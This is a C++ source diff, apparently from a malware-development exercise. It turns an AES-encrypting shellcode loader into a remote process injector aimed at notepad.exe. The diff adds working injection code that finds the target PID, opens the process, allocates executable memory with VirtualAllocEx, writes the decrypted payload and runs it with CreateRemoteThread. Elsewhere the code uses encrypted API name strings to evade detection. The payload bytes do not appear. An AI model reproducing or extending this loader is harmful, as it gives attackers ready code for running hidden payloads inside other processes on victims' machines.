@@ -13,6 +13,7 @@ using namespace std;
 //virtual protect
 //rtlmovememory
 //virtualalloc
+// virtualallocex
 //create thread
 
 typedef LPVOID(WINAPI* VirtualAlloc_t)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
@@ -61,63 +62,40 @@ int findTarget(const char* procname) {
 	PROCESSENTRY32 pe32;
 	int pid = 0;
 
+	const wchar_t* pname = L"notepad.exe";
+
 	hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-	if (INVALID_HANDLE_VALUE == hProcSnap) {
-		return 0;
-	}
+	if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
 
 	pe32.dwSize = sizeof(PROCESSENTRY32);
 
-	if (!Process32First(hProcSnap, &pe32)) {
+	if (!Process32FirstW(hProcSnap, &pe32)) {
 		CloseHandle(hProcSnap);
 		return 0;
 	}
 
-	while (Process32Next(hProcSnap, &pe32)) {
-		if (lstrcmpiA(procname, (LPSTR)pe32.szExeFile) == 0) {
+	while (Process32NextW(hProcSnap, &pe32)) {
+		//printf("procname %s, %s\n", procname, pe32.szExeFile);
+		wcout << "\n" << "comparing with: " << pe32.szExeFile << "\n";
+		wcout << "\n" << "notepad string :" << procname << "\n";
+		if (wcscmp(pname, pe32.szExeFile) == 0) {
 			pid = pe32.th32ProcessID;
 			break;
 		}
 	}
 
 	CloseHandle(hProcSnap);
+
 	return pid;
 }
 
 int Inject(HANDLE hProc, unsigned char* payload, unsigned int payload_len) {
 
-	// I wanna die
-	LPVOID pRemoteCode = NULL;
-	HANDLE hThread = NULL;
-
-	pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
-	WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T*)NULL);
-
-	hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
-	if (hThread != NULL) {
-		WaitForSingleObject(hThread, 500);
-		CloseHandle(hThread);
-		return 0;
-	}
-
-	return -1;
-}
-
-
-
-//looking at process injection
-int main(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
-
+	/*
 	LPVOID exec_mem;
 	bool rv;
 	HANDLE th;
 	DWORD oldprotect = 0;
-
-	unsigned int payload_len = sizeof payload;
-
-	int pid = 0;
-	HANDLE hProc = NULL;
-	pid = findTarget("explorer.exe"); // tbc
 
 	AESDecrypt((char*)cipher_vProtect, sizeof cipher_vProtect, (char*)key, sizeof key);
 	AESDecrypt((char*)cipher_vAlloc, sizeof cipher_vAlloc, (char*)key, sizeof key);
@@ -136,21 +114,21 @@ int main(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmd
 	//RtlMoveMemory_t pRtlMoveMemory = (RtlMoveMemory_t)GetProcAddress(GetModuleHandle(L"KERNEL32.DLL"), (char *) cipher_rMoveMemory);
 	RtlMoveMemory_t pRtlMoveMemory = (RtlMoveMemory_t)GetProcAddress(GetModuleHandle(L"KERNEL32.DLL"), "RtlMoveMemory");
 
-	
+
 	exec_mem = pVirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
-	/*
-	printf("%-20s : 0x%-016p\n", "addr of void * payload", (void*)payload);
-	printf("%-20s : 0x%-016p\n", "payload & addr", &payload);
-	printf("%-20s : 0x%-016p\n", "payload addr", payload);
+	
+	//printf("%-20s : 0x%-016p\n", "addr of void * payload", (void*)payload);
+	//printf("%-20s : 0x%-016p\n", "payload & addr", &payload);
+	//printf("%-20s : 0x%-016p\n", "payload addr", payload);
 
-	printf("%-20s : 0x%-016p\n", "exec_mem void * addr", (void*)exec_mem);
-	printf("%-20s : 0x%-016p\n", "exec_mem  addr", exec_mem);
-	printf("%-20s : 0x%-016p\n", "exec_mem &  addr", &exec_mem);
-	*/
+	//printf("%-20s : 0x%-016p\n", "exec_mem void * addr", (void*)exec_mem);
+	//printf("%-20s : 0x%-016p\n", "exec_mem  addr", exec_mem);
+	//printf("%-20s : 0x%-016p\n", "exec_mem &  addr", &exec_mem);
+	
 
 	AESDecrypt((char*)payload, payload_len, (char*)key, sizeof key);
-	
+
 
 
 	//cout << " payload " << payload << " key " << key;
@@ -160,7 +138,71 @@ int main(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmd
 
 	if (rv != 0) {
 		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
-		WaitForSingleObject(th, -1);  
+		WaitForSingleObject(th, -1);
+	}
+	*/
+
+
+	// I wanna die
+	LPVOID pRemoteCode = NULL;
+	HANDLE hThread = NULL;
+	SIZE_T* f = NULL;
+
+	printf("Here reached at notepad");
+
+	pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
+
+	WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, f);
+
+	getchar();
+
+
+	hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
+
+	cout << "\nhThread : " << hThread << " , " << hProc << " , " << payload_len << " , " << pRemoteCode << " , " << f << "\n";
+
+	if (hThread != NULL) {
+
+		cout << "createRemotethread called\n";
+		
+		WaitForSingleObject(hThread, 500);
+		CloseHandle(hThread);
+		return 0;
+	}
+	else {
+		cout << "\nnot able to create remote thread";
+	}
+
+	return -1;
+}
+
+
+
+//looking at process injection
+int main(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+
+	unsigned int payload_len = sizeof payload;
+
+	int pid = 0; 
+	HANDLE hProc = NULL;
+
+	pid = findTarget("notepad.exe");
+
+	printf("\nfindtarget done\n");
+	printf("\nthe pid is %d\n", pid);
+
+	if (pid) {
+		printf("Notepad.exe PID = %d\n", pid);
+
+		hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD)pid);
+
+		if (hProc != NULL) {
+			Inject(hProc, payload, payload_len);
+			CloseHandle(hProc);
+		}
+		else {
+			cout << "\nNOtepad not open dude.\n";
+		}
 	}
 
 	
